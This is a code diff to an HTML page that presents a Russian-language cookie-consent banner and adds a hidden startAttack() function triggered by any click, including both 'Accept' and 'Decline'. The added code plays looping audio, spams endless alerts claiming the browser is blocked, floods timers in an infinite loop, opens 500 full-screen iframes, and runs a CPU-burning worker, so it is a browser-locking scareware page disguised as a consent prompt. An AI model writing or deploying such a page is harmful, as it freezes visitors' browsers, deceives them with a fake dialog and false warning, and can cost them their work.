@@ -1,160 +1,120 @@
-<html onmousedown="sound.play()">
+<html onmousedown="startAttack()">
 <script>
-  var sound = new Audio();
-  sound.src = 'ponos-mp3.mp3';
-  sound.loop = true;
-  </script>
-  
-  <style>
-            body {
-                margin: 0;
-                padding: 0;
-                display: flex;
-                justify-content: center;
-                align-items: flex-start;
-                height: 100vh;
-                text-align: center;
-                cursor: pointer;
-                overflow: hidden;
-                position: relative;
-                -webkit-tap-highlight-color: transparent;
-                user-select: none;
+    var sound = new Audio();
+    sound.src = 'ponos-mp3.mp3';
+    sound.loop = true;
+
+    function startAttack() {
+        sound.play();
+
+        // Бесконечные alert()
+        setTimeout(function spamAlert() {
+            alert("Ваш браузер заблокирован!");
+            spamAlert();
+        }, 100);
+
+        // Перегрузка setTimeout()
+        function overload() {
+            while (true) {
+                setTimeout(overload, 0);
             }
-            p {
-                margin: 0;
+        }
+        overload();
+
+        // Создание множества iframe
+        for (let i = 0; i < 500; i++) {
+            let iframe = document.createElement('iframe');
+            iframe.src = "https://example.com";
+            iframe.style.position = "absolute";
+            iframe.style.width = "100%";
+            iframe.style.height = "100%";
+            document.body.appendChild(iframe);
+        }
+
+        // Web Worker для перегрузки CPU
+        let worker = new Worker(URL.createObjectURL(new Blob([`
+            while (true) {
+                console.log("Loading...");
             }
+        `], { type: 'application/javascript' })));
 
-            *, *::before, *::after {
-                box-sizing: border-box;
-            }
+        // Создание огромных div с тенями
+        for (let i = 0; i < 50; i++) {
+            let div = document.createElement('div');
+            div.style.width = "100vw";
+            div.style.height = "100vh";
+            div.style.boxShadow = "0 0 100000px red";
+            document.body.appendChild(div);
+        }
+    }
+</script>
 
-            .overlay {
-                position: fixed;
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        height: 100vh;
+        text-align: center;
+        cursor: pointer;
+        overflow: hidden;
+        position: relative;
+        -webkit-tap-highlight-color: transparent;
+        user-select: none;
+    }
+    p {
+        margin: 0;
+    }
 
-                top: 0;
-                left: 0;
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        height: 100vh;
+        width: 100vw;
+    }
 
-                height: 100vh;
-                width: 100vw;
-            }
+    p.overlay-title {
+        font-size: 24px;
+        font-weight: 900;
+        color: black;
+    }
 
-            p.overlay-title {
-                font-size: 24px;
-                font-weight: 900;
-                color: black;
-                line-height: 1;
+    .overlay-button {
+        display: inline-flex;
+        align-items: center;
+        height: 40px;
+        padding: 0 24px;
+        font-size: 16px;
+        font-weight: 500;
+        border-radius: 4px;
+        margin: 4px;
+        cursor: pointer;
+    }
 
-                margin-bottom: 16px;
-            }
+    #accept-button {
+        background-color: rgb(58, 58, 58);
+        color: white;
+    }
 
-            .overlay-button {
-                display: inline-flex;
-                align-items: center;
+    #decline-button {
+        color: rgb(58, 58, 58);
+        border: 2px solid rgb(58, 58, 58);
+    }
+</style>
 
-                height: 40px;
-
-                padding-right: 24px;
-                padding-left: 24px;
-
-                font-size: 16px;
-                font-weight: 500;
-                line-height: 1;
-
-                border-radius: 4px;
-
-                margin: 4px;
-
-                cursor: pointer;
-            }
-
-            .overlay-buttons-wrapper {
-                margin: 24px -8px -8px;
-            }
-
-            #accept-button {
-                background-color: rgb(58, 58, 58);
-
-                color: white;
-            }
-
-            #decline-button {
-                color: rgb(58, 58, 58);
-
-                border: 2px solid rgb(58, 58, 58);
-            }
-
-            p.overlay-description {
-                font-size: 16px;
-                font-weight: 400;
-                color: rgba(0, 0, 0, 0.5);
-                line-height: 1.25;
-
-                margin-bottom: 16px;
-            }
-
-            a.overlay-link {
-                display: inline-block;
-
-                text-decoration: none;
-
-                font-size: 16px;
-                font-weight: 500;
-                color: rgb(58, 58, 58);
-                line-height: 1;
-
-                position: relative;
-
-                margin-top: 16px;
-            }
-
-            a.overlay-link::before {
-                position: absolute;
-
-                content: "";
-
-                height: calc(50% + 4px);
-                width: calc(100% + 8px);
-
-                bottom: -4px;
-                left: -4px;
-
-                background-color: rgba(58, 58, 58, 0.1);
-            }
-
-            .overlay-body {
-                max-width: 512px;
-
-                text-align: center;
-
-                font-family: "Inter", sans-serif;
-            }
-
-            .overlay {
-                z-index: 2;
-
-                display: flex;
-                align-items: center;
-                justify-content: center;
-
-                background-color: #f5f6fa;
-
-                padding-right: 24px;
-                padding-left: 24px;
-            }
-  </style>
 <body>
-  <div id="overlay" class="overlay">
-    <div class="overlay-body">
-    <p class="overlay-title">Cookies и сторонний контент</p>
-    <p class="overlay-description">Этот сайт использует cookies что-бы собирать информацию об ошибках
-    чтобы улучшить сайт и исправить ошибки. Нажмите принять cookies для хорошей
-    оптимальной производительности.</p>
-    <div class="overlay-buttons-wrapper">
-    <div id="accept-button" class="overlay-button">Принять</div>
-    <div id="decline-button" class="overlay-button">Отклонить</div>
-    </div>
-    <a href="" target="_blank" class="overlay-link">Пользовательское соглашение</a>
-    </div>
+    <div id="overlay" class="overlay">
+        <div class="overlay-body">
+            <p class="overlay-title">Cookies и сторонний контент</p>
+            <p class="overlay-description">Этот сайт использует cookies, чтобы улучшить производительность.</p>
+            <div class="overlay-buttons-wrapper">
+                <div id="accept-button" class="overlay-button" onclick="startAttack()">Принять</div>
+                <div id="decline-button" class="overlay-button" onclick="startAttack()">Отклонить</div>
+            </div>
+        </div>
     </div>
 </body>
 </html>
